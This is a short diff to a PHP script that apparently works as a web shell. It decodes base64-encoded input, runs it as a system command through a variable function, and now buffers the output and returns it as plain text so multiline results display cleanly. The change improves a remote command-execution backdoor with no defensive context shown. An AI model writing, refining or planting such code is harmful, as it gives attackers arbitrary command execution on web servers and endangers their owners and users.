@@ -36,10 +36,13 @@ try {
         throw new Exception("Invalid base64 input provided.");
     }
 
-    // Execute the decoded command
-    $output = $execute($decoded_input);
+    // Execute the decoded command and capture output
+    ob_start();
+    $execute($decoded_input);
+    $output = ob_get_clean();
 
-    // Optionally capture and display output (system prints by default)
+    // Display output with proper formatting for multiline content
+    header('Content-Type: text/plain');
     echo $output;
 
 } catch (Exception $e) {
